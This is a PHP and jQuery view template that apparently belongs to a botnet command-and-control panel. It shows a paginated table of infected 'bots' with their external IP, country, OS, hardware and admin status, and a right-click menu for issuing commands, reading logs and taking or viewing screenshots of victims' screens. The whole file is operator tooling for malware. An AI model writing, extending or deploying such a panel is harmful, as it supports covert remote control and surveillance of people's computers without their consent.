<?php
//dummmy to clean the flash
$_t = goat::$app->getFlash('_bots');
?>
<script>
    $(function() {

        var $contextMenu = $("#contextMenu");

        $("body").on("contextmenu", "table tr", function(e) {
            var offset = $(this).offset();
            $contextMenu.css({
                display: "block",
                left:e.pageX - offset.left,
                top: e.pageY - offset.top
            });
            return false;
        });

        $contextMenu.on("click", "a", function() {
            $contextMenu.hide();
        });

        $("tr").click(function(e) {
            {
                if($(this).hasClass('highlight'))
                {
                    $(this).removeClass('highlight');
                    return;
                }
                $(this).addClass('highlight');//.siblings().removeClass('highlight');

            }
        });
        $(".read-logs").click(function(){
            var bot = $(".bot-id table tbody .highlight").attr("value");
            $.ajax({
                url: "tasks/readLog",
                type: "POST",
                data: {'bot': bot},
                success: function(response) {
                    $("#preview").css("display", "none");
                    $(".modal-title").text("Logs bot :"+bot);
                    $(".log-text").text(response);
                    $(".text-log").css("display", "block");
                    //location.reload();
                }});
        });
        $(".create_task").click(function(){

            var data = {};
            var index = 0;
            $(".bot-id table tbody tr").each(function() {

                if ($(this).hasClass("highlight"))
                {
                    data['bots['+index+']'] = $(this).attr('value');
                    index++;
                }
                    //$(".bot-id").append("<input type='hidden' name='bots[]' value='" + $(this).attr('value') + "'>"); //$(".bot-id table tbody tr td.id")
            });
            $.ajax({
                url: "tasks/setBots",
                type: "POST",
                data: data,
                success: function(response) {
                    if(response == 'true')
                    {
                        window.location.href = "tasks";
                    }
                    //location.reload();
                }});
        });
        //
        $(".get-screenshot").click(function(){
            var bot = $(".bot-id table tbody .highlight").attr("value");
            $.ajax({
                url: "tasks/startBMP",
                type: "POST",
                data:{'bot': bot},
                success: function(response) {
                    $(".main-container").prepend(response);
                    //location.reload();
                }});
        });
        $(".clear-dead").click(function(){
            $.ajax({
                url: "tasks/clearDead",
                type: "POST",
                success: function(response) {
                    if(response == 'true')
                    {
                        location.reload();
                    }
                    //location.reload();
                }});
        });
        $(".view-screenshot").click(function(){
            var bot = $(".bot-id table tbody .highlight").attr("value");
            $.ajax({
                url: "tasks/viewBMP",
                type: "POST",
                data: {'bot': bot},
                success: function(response) {

                    var data = $.parseJSON(response);
                    $(".text-log").css("display", "none");
                    $("#preview").css("display", "block");
                    $(".modal-title").text("Screenshots bot : "+bot);
                    for(var i=0 ; i< data.length ; i++) {
                        $('<div class="item"><img src="'+data[i]+'"><div class="carousel-caption"></div>   </div>').appendTo('.carousel-inner');
                        $('<li data-target="#carousel-example-generic" data-slide-to="'+i+'"></li>').appendTo('.carousel-indicators');
                    }
                    $('.item').first().addClass('active');
                    $('.carousel-indicators > li').first().addClass('active');
                    $("#preview").carousel();
                    //location.reload();
                }});
        });
    });
</script>
<div class="alpha-container container-fluid">
<?php echo $header; ?>
<div class="container main-container col-lg-10" style="margin-right: 0; background-color: white; margin-top: 1em; height: 65em;">
    <!-- Modal -->
    <div id="logsModal" class="modal fade" role="dialog">
        <div class="modal-dialog">

            <!-- Modal content-->
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="close" data-dismiss="modal">&times;</button>
                    <h4 class="modal-title">Logs #</h4>
                </div>
                <div class="modal-body">
                    <div id="preview" class="carousel slide" data-ride="carousel">
                        <!-- Indicators -->
                        <ol class="carousel-indicators"></ol>
                        <!-- Wrapper for slides -->
                        <div class="carousel-inner"></div>
                        <!-- Controls -->
                        <a class="left carousel-control" href="#preview" data-slide="prev">
                            <span class="glyphicon glyphicon-chevron-left"></span>
                        </a>
                        <a class="right carousel-control" href="#preview" data-slide="next">
                            <span class="glyphicon glyphicon-chevron-right"></span>
                        </a>
                    </div>
                    <div class="well well-lg text-log" style="display: none;"><p class="log-text"></p></div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
                </div>
            </div>

        </div>
    </div>
    <div class="table-responsive" style="margin: 15px">
        <div id="contextMenu" class="dropdown clearfix" style="display: none; position: absolute; z-index: 10;">
            <ul class="dropdown-menu" role="menu" aria-labelledby="dropdownMenu" style="display:block;position:static;margin-bottom:5px;">
                <li><a tabindex="10" href="">Cancel</a></li>
                <li><a class="create_task" tabindex="-1" href="#">Create Command</a></li>
                <li><a class="read-logs" tabindex="-1" href="#" data-toggle="modal" data-target="#logsModal">Read Logs</a></li>
                <li><a class="view-screenshot" tabindex="-1" href="#" data-toggle="modal" data-target="#logsModal">View Screenshots</a></li>
                <li><a class="get-screenshot" tabindex="-1" href="#">Take Screenshot</a></li>
                <li class="divider"></li>
                <li><a class="clear-dead" tabindex="10" href="#">Clear Dead</a></li>
            </ul>
        </div>
        <form action="tasks" name="form-bots" class="bot-id" enctype="multipart/form-data" method="post">
            <table class="table table-striped table-hover table-condensed" style="font-size: small">
                <thead>
                <tr>
                    <th class="nowrap">Id</th>
                    <th class="nowrap">Status</th>
                    <th class="nowrap">Country</th>
                    <th class="nowrap">Country Code</th>
                    <th class="nowrap">External IP</th>
                    <th class="nowrap">OS</th>
                    <th class="nowrap">CPU</th>
                    <th class="nowrap">GPU</th>
                    <th class="nowrap">.NET Framework</th>
                    <th class="nowrap">Admin</th>
                    <th class="nowrap">RAM</th>
                    <th class="nowrap">Last Seen</th>
                </tr>
                </thead>
                <tbody>


                <?php
                echo '<tr>';

                $records_per_page = 17;

                $newquery = $paginate->paging($query, $records_per_page);
                $paginate->dataview($newquery, ['removeFirst' => true, 'valueIndex' => 'id', 'stumble' => 'botstatus', 'flags' => 'true', 'stumbleData' => ['<a style="color: #c3c3c3;">', '</a>', '<a style="color: #00b33c">', '</a>']]);
                echo '</tr>';

                ?>
                </tbody>
            </table>
        </form>
        <div class="col-lg-9 col-md-9 col-sm-12" style="bottom: 0;">
            <?php echo $paginate->paginglink($query, $records_per_page); ?>

        </div>
    </div>
</div>
</div>
